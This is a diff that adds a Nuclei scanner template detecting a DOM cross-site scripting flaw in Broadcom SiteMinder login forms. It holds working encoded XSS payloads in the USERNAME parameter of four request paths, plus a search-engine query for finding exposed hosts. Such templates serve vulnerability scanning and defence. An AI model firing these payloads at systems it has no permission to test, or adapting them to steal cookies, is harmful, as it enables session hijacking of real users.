@@ -1,0 +1,50 @@
+id: siteminder-dom-xss
+
+info:
+  name: SiteMinder - DOM Cross-Site Scripting
+  author: clarkvoss
+  severity: high
+  description: SiteMinder contains a cross-site scripting vulnerability in the document object model. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+  reference:
+    - https://blog.reigningshells.com/2019/12/reviving-old-cves-reflected-xss-in-ca.html
+    - https://github.com/projectdiscovery/nuclei-templates/issues/2736
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-79
+    cpe: cpe:2.3:a:broadcom:siteminder:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 2
+    google-query: inurl:"smpwservices.fcc"
+    product: siteminder
+    vendor: broadcom
+  tags: dom,xss,siteminder
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/siteminderagent/forms/smpwservices.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&SMAUTHREASON=7'
+      - '{{BaseURL}}/siteminderagent/forms/smaceauth.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&SMAUTHREASON=7'
+      - '{{BaseURL}}/siteminderagent/forms/smpwservices.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm\u0028document.domain\u0029\u0022\u003e&SMAUTHREASON=7'
+      - '{{BaseURL}}/siteminderagent/forms/smaceauth.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm\u0028document.domain\u0029\u0022\u003e&SMAUTHREASON=7'
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '\u003d\u0022confirm(document.domain)\u0022\u003e</B> you cannot access your'
+          - '\u003d\u0022confirm\u0028document.domain\u0029\u0022\u003e</B> you cannot access your'
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - 'text/html'
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a00473045022046aa8e32da9f0e6025a7f2fffad096418ff274d282055f1834a80edacad7dbe0022100a2a682c3e28fb0d364f55770dff59f1094c87e5f23178c9588e22c232233635a:922c64590222798bb761d5b6d8e72950
